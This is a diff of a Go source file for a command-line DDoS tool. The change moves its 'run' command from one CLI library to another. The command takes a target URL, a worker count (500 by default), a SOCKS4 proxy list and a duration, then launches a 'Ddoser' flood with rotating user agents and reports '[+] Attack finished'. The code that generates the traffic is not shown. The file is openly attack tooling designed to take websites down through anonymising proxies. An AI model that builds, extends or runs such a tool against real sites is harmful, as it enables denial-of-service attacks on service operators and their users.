@@ -4,29 +4,37 @@ import (
 	"fmt"
 	"time"
 
-	"github.com/mkideal/cli"
+	"github.com/symfony-cli/console"
 )
 
-type runT struct {
-	cli.Helper
-	Url      string `cli:"*url"`
-	Worker   int    `cli:"w,workers" dft:"500"`
-	File     string `cli:"f,file" dft:"socks4.txt"`
-	Duration int    `cli:"d,duration" dft:"10"`
-}
-
-var attackCommand = &cli.Command{
+var runCommand = &console.Command{
 	Name: "run",
-	Desc: "Deploy the attack",
-	Argv: func() interface{} {
-		return new(runT)
+	Flags: []console.Flag{
+		&console.StringFlag{
+			Name:     "url",
+			Required: true,
+		},
+		&console.IntFlag{
+			Name:         "worker",
+			Aliases:      []string{"w"},
+			DefaultValue: 500,
+		},
+		&console.StringFlag{
+			Name:         "file",
+			Aliases:      []string{"f"},
+			DefaultValue: "socks4.txt",
+		},
+		&console.DurationFlag{
+			Name:         "duration",
+			Aliases:      []string{"d"},
+			DefaultValue: time.Second * 10,
+		},
 	},
-	Fn: func(ctx *cli.Context) error {
-		argv := ctx.Argv().(*runT)
+	Action: func(c *console.Context) error {
 		useragents := getUserAgents(500)
-		proxies := readLines(argv.File)
+		proxies := readLines(c.String("file"))
 
-		ddoser, err := NewDdoser(argv.Url, argv.Worker, useragents, proxies)
+		ddoser, err := NewDdoser(c.String("url"), c.Int("worker"), useragents, proxies)
 		if err != nil {
 			return err
 		}
@@ -35,7 +43,7 @@ var attackCommand = &cli.Command{
 
 		ddoser.Run()
 
-		time.Sleep(time.Duration(argv.Duration) * time.Second)
+		time.Sleep(c.Duration("duration"))
 
 		fmt.Println("[+] Attack finished")
 
